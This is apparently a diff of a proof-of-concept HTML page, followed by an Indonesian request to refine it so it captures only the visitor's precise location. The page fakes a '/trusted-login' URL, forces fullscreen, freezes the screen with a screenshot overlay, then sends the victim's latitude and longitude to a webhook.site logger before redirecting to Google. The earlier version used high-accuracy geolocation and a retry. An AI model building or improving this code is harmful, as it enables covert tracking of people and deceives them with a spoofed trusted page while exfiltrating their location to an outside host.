@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Geo Focus PoC</title>
+<title>Android Geo Final PoC</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
@@ -23,61 +23,40 @@ button {
   background:#007aff;
   color:#fff;
 }
+#output {
+  margin-top:20px;
+  font-size:14px;
+}
 </style>
 </head>
 
 <body>
 
-<button id="start">Start Demo</button>
+<button id="start">Start Demo nice</button>
+<p id="output">Location: -</p>
 
 <script>
 const TARGET = "https://www.google.com";
 const LOG_ENDPOINT = "https://webhook.site/248bcd36-211a-4a46-9a54-c54dc32b4119";
 
-let sent = false; // 🔥 biar cuma kirim 1x
+let triggered = false;
 
-// ===== LOGGER (MINIMAL) =====
-function sendLocation(lat, lon, accuracy) {
-  if (sent) return;
-  sent = true;
+// ===== LOGGER (VERSI KAMU) =====
+function logEvent(type, extra = {}) {
+  const data = {
+    type,
+    ts: performance.now().toFixed(3),
+    epoch: Date.now(),
+    url: location.href,
+    origin: location.origin,
+    visibility: document.visibilityState,
+    readyState: document.readyState,
+    ...extra
+  };
 
-  const data = new URLSearchParams({
-    lat,
-    lon,
-    acc: accuracy,
-    ts: Date.now()
-  });
+  const params = new URLSearchParams(data).toString();
 
-  new Image().src = `${LOG_ENDPOINT}?${data}`;
-}
-
-// ===== GEO (HIGH ACCURACY) =====
-function getLocation() {
-  if (!navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      sendLocation(
-        pos.coords.latitude,
-        pos.coords.longitude,
-        pos.coords.accuracy
-      );
-
-      // optional redirect
-      setTimeout(() => {
-        location.href = TARGET;
-      }, 3000);
-    },
-    err => {
-      // retry sekali kalau gagal
-      setTimeout(getLocation, 1000);
-    },
-    {
-      enableHighAccuracy: true,  // 🔥 penting
-      timeout: 10000,
-      maximumAge: 0              // 🔥 no cache
-    }
-  );
+  new Image().src = `${LOG_ENDPOINT}?${params}`;
 }
 
 // ===== FREEZE UI =====
@@ -85,6 +64,7 @@ function freezeUI() {
   return html2canvas(document.body,{scale:2}).then(canvas=>{
     const img = document.createElement("img");
     img.src = canvas.toDataURL();
+
     Object.assign(img.style,{
       position:"fixed",
       top:"0",
@@ -93,25 +73,92 @@ function freezeUI() {
       height:"100vh",
       zIndex:"999999"
     });
+
     document.body.innerHTML="";
     document.body.appendChild(img);
+
+    logEvent("ui_frozen");
   });
 }
 
+// ===== GEO (VERSI KAMU) =====
+function getLocation() {
+  if (!navigator.geolocation) return;
+
+  logEvent("geolocation_requested");
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      logEvent("geolocation_success", {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      });
+
+      // tetap log ke UI (kalau sempat sebelum freeze)
+      const out = document.getElementById("output");
+      if (out) {
+        out.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      }
+    },
+    err => {
+      logEvent("geolocation_error", { code: err.code });
+
+      const out = document.getElementById("output");
+      if (out) {
+        out.textContent = 'Permission denied';
+      }
+    }
+  );
+}
+
+// ===== REDIRECT DELAY =====
+function delayedRedirect() {
+  if (triggered) return;
+  triggered = true;
+
+  logEvent("returned_from_settings");
+
+  setTimeout(() => {
+    logEvent("redirecting", {target: TARGET});
+
+    // 🔥 pakai href sesuai request kamu
+    location.href = TARGET;
+
+  }, 2800);
+}
+
+// ===== DETECT BALIK =====
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "visible") {
+    delayedRedirect();
+  }
+});
+
+window.addEventListener("focus", delayedRedirect);
+window.addEventListener("pageshow", delayedRedirect);
+
 // ===== START =====
 document.getElementById("start").onclick = () => {
+
+  logEvent("poc_started");
 
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen();
   }
 
   history.replaceState({}, '', '/trusted-login');
+  logEvent("url_spoofed");
 
   freezeUI().then(()=>{
-    setTimeout(getLocation, 100);
+    setTimeout(()=>{
+      getLocation(); // pakai versi kamu
+    },100);
   });
 };
+
 </script>
 
 </body>
 </html>
+
+perbaiki intinya fokus menangkap lokasi saja soalnya sangat banyak requestnya di webooh fokus utama menangkap loasi dengan akurat
